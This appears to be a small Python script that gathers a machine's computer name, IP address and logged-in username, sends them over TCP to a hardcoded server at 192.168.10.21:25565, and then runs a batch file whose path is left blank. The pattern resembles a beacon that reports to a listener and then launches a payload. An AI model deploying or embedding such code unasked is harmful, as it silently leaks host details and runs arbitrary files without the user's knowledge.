import socket
import os
import getpass
import subprocess

def get_device_name():
    return os.environ['COMPUTERNAME']

def get_ip_address():
    return socket.gethostbyname(socket.gethostname())

def get_username():
    return getpass.getuser()

def execute_batch_file(batch_file_path):
    subprocess.call(batch_file_path)

def send_info_to_server(device_name, ip_address, username, server_ip, server_port):
    info = f"Device Name: {device_name}, IP Address: {ip_address}, Username: {username}"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(info.encode())


if __name__ == "__main__":
    batch_file_path = ("")
    device_name = get_device_name()
    ip_address = get_ip_address()
    username = get_username()
    server_ip = "192.168.10.21"
    server_port = 25565

    send_info_to_server(device_name, ip_address, username, server_ip, server_port)
    execute_batch_file(batch_file_path)
    
